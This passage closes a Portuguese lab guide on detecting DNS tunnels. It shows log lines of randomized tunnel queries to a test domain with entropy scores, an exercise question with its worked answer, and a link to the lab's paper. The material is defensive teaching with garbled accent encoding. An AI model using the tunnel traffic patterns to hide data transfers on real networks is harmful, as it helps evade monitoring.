1750088913.024773       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      yrbzjw.t1.teste.ufba.com        3.886842        18867.0 DOMAIN_ANALYSIS
1750088913.032049       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      vaaaakatfg2.t1.teste.ufba.com   3.767993        19948.0 DOMAIN_ANALYSIS
1750088913.041505       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      laaicaraon53srcqdr24molvjapxwkoa.t1.teste.ufba.com      4.568367        24743.0 DOMAIN_ANALYSIS
1750088913.045905       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      yrbzjz.t1.teste.ufba.com        3.803509        18874.0 DOMAIN_ANALYSIS
1750088913.056969       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      zzj0aa-aaahhh-drink-mal-ein-j\xe4germeister-.t1.teste.ufba.com  4.328565        28894.0 DOMAIN_ANALYSIS
1750088913.071620       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      zzj1aa-la-fl\xfbte-na\xefve-fran\xe7aise-est-retir\xe9-\xe0-cr\xe8te.t1.teste.ufba.com  4.251981    30105.0 DOMAIN_ANALYSIS
1750088913.085348       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      zzj2aabbccddeeffgghhiijjkkllmmnnooppqqrrssttuuvvwwxxyyzz.t1.teste.ufba.com      4.808795   23871.0  DOMAIN_ANALYSIS
1750088913.100751       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      zzj3aa0123456789\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf.t1.teste.ufba.com  5.282484        18861.0 DOMAIN_ANALYSIS
1750088913.129206       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      zzj4aa\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd.t1.teste.ufba.com    5.822001        18796.0 DOMAIN_ANALYSIS
1750088913.136824       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      sahzj5.t1.teste.ufba.com        3.886842        19099.0 DOMAIN_ANALYSIS
1750088913.140520       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      oalzka.t1.teste.ufba.com        3.803509        20280.0 DOMAIN_ANALYSIS
1750088913.216992       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      rayadg\xd7oukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg.\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xce.oukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceo.ukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xce.t1.teste.ufba.com 3.466838        35169.0 DOMAIN_ANALYSIS
1750088913.296240       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      rbeadhzoksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0h.q\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq.\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6.ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq.t1.teste.ufba.com       3.49095 24491.0 DOMAIN_ANALYSIS
```

Perceba que em algumas linhas hÃ¡ a presenÃ§a de bits em codificaÃ§Ã£o hexadecimal como `\xd3`, o que pode ser resultado da codifiÃ§Ã£o de caracteres especiais como `$`.

> [!IMPORTANT]
> Quais diferenÃ§as vocÃª percebe nos valores de entropia e pontuaÃ§Ã£o para os domÃ­nios benignos e para os domÃ­nios gerados aleatoriamente no contexto do tÃºnel DNS? Quais as possÃ­veis justificativas para tais difentes?
<textarea name="resposta_dump_manual" rows="6" cols="80" placeholder="Escreva sua resposta aqui..."> </textarea>

Ã‰ possÃ­vel observar que os valores de entropia sÃ£o maiores entre os nomes de domÃ­nio relativos ao tÃºnel, o que tem relaÃ§Ã£o com fato de estes nomes serem gerados aleatoriamente, incluindo caracteres especiais, cuja codificaÃ§Ã£o Ã© prejudica, como podemos observar anteriormente. Ainda assim, o valor de pontuaÃ§Ã£o para os domÃ­nios gerados aleatoriamente acabam sendo maiores, o que pode ser justificado pelo comprimento dos mesmos ou por conta da presenÃ§a de bigramas com altos valores de frequÃªncia, como os contidos em `.com`.

A criaÃ§Ã£o deste laboratÃ³rio culminou na escrita do artigo "AvaliaÃ§Ã£o de estratÃ©gias para o aperfeiÃ§oamento da detecÃ§Ã£o de anomalias no trÃ¡fego DNS", o qual recebeu a premiaÃ§Ã£o de melhor artigo no VIII WTG do SBRC 2025 e pode ser acessado [aqui](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab05-seguranca-dns/docs/artigo_tunelamento_dns.pdf), sendo a leitura opcional.

Com isso, finalizamos as atividades deste laboratÃ³rio, no qual foi possÃ­vel aprender sobre o processo de criaÃ§Ã£o de tÃºneis DNS e analisar as informaÃ§Ãµes relativas a ele.
